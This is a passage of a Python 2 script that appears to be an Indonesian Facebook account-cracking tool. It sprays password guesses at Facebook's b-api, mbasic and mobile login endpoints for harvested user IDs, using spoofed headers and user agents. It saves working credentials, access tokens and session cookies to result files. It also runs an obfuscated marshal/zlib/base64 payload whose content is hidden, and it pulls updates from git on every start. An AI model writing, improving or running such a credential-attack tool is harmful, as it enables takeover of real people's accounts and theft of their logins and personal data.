            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"
            }
            bapi = "https://b-api.facebook.com/v1.0/method/auth.login?format=json&email=&password=&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m[!] IP blocked. turn on airplane mode 2 seconds"),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r%s[SH4NI-OK ] %s | %s | %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s|%s|%s' % (user,pw,response.json()['access_token']))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s|%s|%s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s[SH4NI-CP] %s | %s | %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s|%s|%s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s[SH4NI-CP] %s | %s           ' % (K,user,pw)
                cp.append('%s|%s' % (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s\n"%(user,pw))
                break
                continue
        loop += 1
        #rm = random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m"])
        print('\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s > '%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]','NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0','Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({         
            "Host":"mbasic.facebook.com",
            "cache-control":"max-age=0",
            "upgrade-insecure-requests":"1",
            "user-agent":ua,
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate",
            "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.8"
            })
            p = ses.get("https://mbasic.facebook.com/")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fdevice'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[SH4NI-OK] %s | %s | %s  ' % (H,user,pw,coki)
                ok.append("%s|%s|%s"% (user,pw,coki))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s[SH4NI-CP] %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s|%s|%s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s[SH4NI-CP] %s | %s            ' % (K,user,pw)
                cp.append("%s|%s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s\n"%(user,pw))
                break
                continue
        loop += 1
        #rm = random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m"])
        print('\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s '%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobile(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({
            "Host":"m.facebook.com",
            "cache-control":"max-age=0",
            "upgrade-insecure-requests":"1",
            "user-agent":ua,
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding":"gzip, deflate",
            "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.8"
            })
            p = ses.get("https://m.facebook.com/")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[SH4NI-OK] %s | %s | %s ' % (H,user,pw,coki)
                ok.append("%s|%s|%s"% (user,pw,coki))
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s\n"%(user,pw,coki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s[SH4NI-CP] %s | %s | %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s|%s|%s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s|%s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s[SH4NI-CP] %s | %s              ' % (K,user,pw)
                cp.append("%s|%s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("%s|%s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m"])
        print('\r\x1b[0;97m[\x1b[0;92m%s\x1b[0;97m] \x1b[0;93m%s/%s \x1b[0;92mOk/%s \x1b[0;97m- \x1b[0;93mCp/%s > '%(datetime.now().strftime('%H:%M:%S'),loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()     
# GANTI USER AGENT
def useragent():
	print ("\n%s[%s1%s] Change User Agent "%(P,K,P))
	print ("[%s2%s] Check User Agent "%(K,P))
	print ("[%s0%s] Back to Menu "%(H,P))
	uas()
def uas():
    __Aang__Sayang__Laura__ = raw_input('\n%s[•] Choose :%s '%(P,K))
    if __Aang__Sayang__Laura__ == '':
        print("%s[•] Correct content kentod"%(M));jeda(2);uas()
    elif __Aang__Sayang__Laura__ in("1","01"):
    	print ("\n%s[%s•%s] Type %sMy user agent%s in google chrome browser\n[%s•%s] to use your own user agent"%(P,K,P,H,P,K,P))
    	print ("[%s•%s] type %sdefault%s to use the script's default user agent"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s[?] User Agent : %s"%(P,K))
            if ua in(""):
            	print("%s[•] Correct content kentod ] "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s[•] You will be redirected to a browser ] "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("Default","DEFAULT","default"):
                ua = 'Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s[✓] Using the default user agent"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s[✓] Successfully changed user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif __Aang__Sayang__Laura__ in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s[%s✓%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s[ %sKembali%s ] "%(P,H,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif __Aang__Sayang__Laura__ in("0","00"):
    	menu()
    else:
        print("%s[•] Correct content kentod"%(M));jeda(2);uas()
# INI MENU ANJING !!!!!!!!
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s[%s!%s] Token invalid tod ! "%(P,M,P));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s[%s!%s] Token invalid tod !"%(P,M,P));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s[%s!%s] No internet connection ! "%(P,M,P))
    banner()
    print ('%s\033[0;93m[\033[0;97m+\033[0;93m] \033[0;97mYour IP   : %s%s'%(P,IP,P))
    print ('%s\033[0;93m[\033[0;97m+\033[0;93m] \033[0;97mVersion   : 2.0.4'%(P))
    print ('%s\033[0;93m[\033[0;97m+\033[0;93m] \033[0;97mYour Name : %s Ngentod %s\n'%(P,nama,H))
    print('%s[%s1%s] Dump ID From Public Friends'%(P,K,P));time.sleep(0.03)
    print('[%s2%s] Dump ID From Total Followers'%(K,P));time.sleep(0.03)
    print('[%s3%s] Dump ID From React Post'%(K,P));time.sleep(0.03)
    print('[%s4%s] %sMulai Crack %s'%(U,P,H,P));time.sleep(0.03)
    print('[%s5%s] Setting/Ganti User Agent'%(U,P));time.sleep(0.03)
    print('[%s6%s] Look %sResults%s Crack'%(U,P,H,P));time.sleep(0.03)
    print('[%s7%s] Bulk Dump ID (%sFrequent Errors%s)'%(H,P,H,P));time.sleep(0.03)
    print('[%s8%s] Check Checkpoint Account Options'%(H,P));time.sleep(0.03)
    print('[%s0%s] Exit (%sRemove Token%s) '%(M,P,H,P));time.sleep(0.03)
    __Aang__Sayang__Laura__ = raw_input('\n%s[?] Choose : %s'%(P,K));time.sleep(0.03)
    if __Aang__Sayang__Laura__ == '':
        print("%s[•] correct content kentod"%(M));jeda(2);menu()
    elif __Aang__Sayang__Laura__ in['1','01']:
        publik(romz)
    elif __Aang__Sayang__Laura__ in['2','02']:
        followers(romz)
    elif __Aang__Sayang__Laura__ in['3','03']:
        postingan(romz)
    elif __Aang__Sayang__Laura__ in['4','04']:
        ngentod().mantan()
    elif __Aang__Sayang__Laura__ in['5','05']:
    	useragent()
    elif __Aang__Sayang__Laura__ in['6','06']:
    	print "\n%s[%s1%s] Facebook account crack results "%(P,K,P)
        __Aang__Sayang__Laura__ = raw_input('%s[%s?%s] Choose: %s'%(P,K,P,H))
    	hasill(__Aang__Sayang__Laura__)
    elif __Aang__Sayang__Laura__ in['7','07']:
        __aangxlaura__()
    elif __Aang__Sayang__Laura__ in['8','08']:
        cek_opsi()
    elif __Aang__Sayang__Laura__ in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s[%s✓%s] Deleted successfully'%(P,H,P));exit()
    else:
        print("%s[•] correct content kentod"%(K));jeda(2);menu()
def hasill(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ in[""]:
		print ("%s[%s•%s] correct content kentod"%(P,P,K));exit()
	elif __Aang__Sayang__Laura__ in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				print("%s[+] %s%s"%(P,B,file));time.sleep(0.02)
			print("\n%s[%s•%s] Example : CP-%s-%s-%s%s"%(P,K,P,ha,op,ta,".txt"))
			file = raw_input("%s[?] Enter filename : "%(P));jeda(1)
			if file == "":
				print("%s[!] The file doesnt have an error"%(K))
			total = open("hasil/%s"%(file)).read().splitlines()
			print("%s[%s•%s] Facebook Account Crack Results"%(P,K,P));jeda(2)
			nm_file = ("%s"%(file)).replace("-", " ")
			jalan("[%s•%s] Total Account : %s"%(K,P,len(total)))
			print("%s[%s#%s]--------------------------------------------------%s"%(P,K,P,H));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace("[×] ", "[×]").replace("[×]", "[×] ")
				print(tling);jeda(0.03)
			print("%s[%s#%s]--------------------------------------------------%s"%(P,K,P,H));jeda(2)
			raw_input('\n%s[ %sPress Enter%s ]'%(P,H,P));menu()
		except (IOError):
			print("\n%s[!] Cant Get Awokawok Results "%(K))
			raw_input('\n%s[ %sPress Enter%s ]'%(P,H,P));menu()
			
# KOPI + PERAWAN = LAMBADA XIXI :V
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
       
if __name__ == '__main__':
    os.system('git pull')
#   __ aangxd__(ganteng)
#    cek_opsi()
    folder()
    menu()    
    
